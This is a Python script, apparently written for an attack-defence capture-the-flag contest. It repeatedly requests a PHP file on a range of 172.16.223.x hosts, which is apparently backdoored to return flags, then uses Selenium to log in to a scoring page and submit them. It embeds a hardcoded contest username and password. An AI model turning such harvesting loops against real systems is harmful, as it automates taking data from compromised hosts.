from selenium import webdriver
import time

while True:
    import requests
    f = open(r'I:\python visual studio code\ctf\flag.txt', 'w+')
    f.write(str(''))
    f = open(r'I:\python visual studio code\ctf\cookie.txt', 'r')
    g = f.readlines()
    for i in g:
        url = 'http://172.16.223.'+str(i[:3])+'/protected/include/core/db/con.php'
        flag = requests.get(url).text
        file = open(r'I:\python visual studio code\ctf\flag.txt', 'a+')
        file.write(str(i[:3])+':'+str(flag)+'\n')
        file.close()
        print(str(i[:3])+'执行完毕')
    dr = webdriver.Firefox()
    dr.get('https://172.16.223.202/match/WAR16/login')
    time.sleep(2)
    username = dr.find_element_by_id('username')
    username.send_keys('1603030134')
    password = dr.find_element_by_id('password')
    password.send_keys('980828')
    login_btn = dr.find_element_by_id('btn_submit')
    login_btn.click()
    time.sleep(2)
    jinru = dr.find_element_by_id('btn-reg')
    jinru.click()
    time.sleep(2)
    pxbaji = dr.find_element_by_class_name('media-text')
    pxbaji.click()
    time.sleep(2)
    flag = dr.find_element_by_id('ipt-flag')
    file = open(r'I:\python visual studio code\ctf\flag.txt', 'r+')
    pfile = file.readlines()
    ticks = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    for i in pfile:
        flag.send_keys(str(i[4:-1]))
        tijiao = dr.find_element_by_id('btn_submit')
        tijiao.click()
        flag.clear()
        time.sleep(2)
        print(str(i[:3]), '提交成功')
    print('本轮flag提交完成-----》等待下轮开始--->当前时间为:'+ticks)
    time.sleep(2000)
